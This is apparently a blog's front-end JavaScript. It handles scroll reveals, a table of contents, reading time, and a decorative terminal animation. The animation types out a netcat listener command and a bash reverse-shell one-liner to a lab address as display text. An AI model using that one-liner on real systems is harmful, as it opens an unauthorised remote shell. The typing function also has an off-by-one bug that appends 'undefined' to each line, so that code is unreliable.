(function(){
  // Reveal on scroll
  const els = Array.from(document.querySelectorAll('.reveal'));
  const io = new IntersectionObserver((entries)=>{
    for (const e of entries){
      if(e.isIntersecting){ e.target.classList.add('is-in'); io.unobserve(e.target); }
    }
  }, {threshold: .12});
  els.forEach(el=>io.observe(el));
})();

// Table of contents + reading time
(function(){
  const container = document.querySelector('.post .post-body');
  if(!container) return;
  const words = container.innerText.trim().split(/\s+/).length;
  const minutes = Math.max(1, Math.round(words/220));
  const rt = document.querySelector('[data-reading-time]');
  if(rt) rt.textContent = minutes + ' min';
  const tocRoot = document.querySelector('.toc ul');
  if(!tocRoot) return;
  const hs = container.querySelectorAll('h2, h3');
  hs.forEach((h,i)=>{
    if(!h.id) h.id = 'sec-' + (i+1);
    const li = document.createElement('li');
    li.className = 'toc-' + h.tagName.toLowerCase();
    const a = document.createElement('a'); a.href = '#' + h.id; a.textContent = h.textContent;
    li.appendChild(a);
    tocRoot.appendChild(li);
  });
})();



// Robust terminal typing animation
(function(){
  const A = document.querySelector('[data-ty="a"]');
  const B = document.querySelector('[data-ty="b"]');
  if(!A || !B) return;

  const seqA = [
    "ncat -lvnp 4444",
    "listening on [any] 4444 ...",
    "connection received from 10.10.10.42"
  ];
  const seqB = [
    "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1",
    "whoami",
    "www-data"
  ];

  function typeLine(el, text, charDelay){
    return new Promise(resolve=>{
      let i=0;
      function tick(){
        el.textContent += text[i++];
        if(i <= text.length){ setTimeout(tick, charDelay); }
        else{ el.textContent += "\n"; resolve(); }
      }
      tick();
    });
  }

  async function runOnce(){
    A.textContent = ""; B.textContent = "";
    for (let i=0;i<Math.max(seqA.length, seqB.length);i++){
      if(seqA[i]) await typeLine(A, seqA[i], 32);
      if(seqB[i]) await typeLine(B, seqB[i], 32);
    }
  }

  const grid = document.querySelector('.term-grid');
  if(!grid){ runOnce(); return; }
  let played = false;
  const io = new IntersectionObserver((entries)=>{
    for(const e of entries){
      if(e.isIntersecting && !played){
        played = true;
        runOnce();
      }
    }
  }, {threshold:.2});
  io.observe(grid);
})();
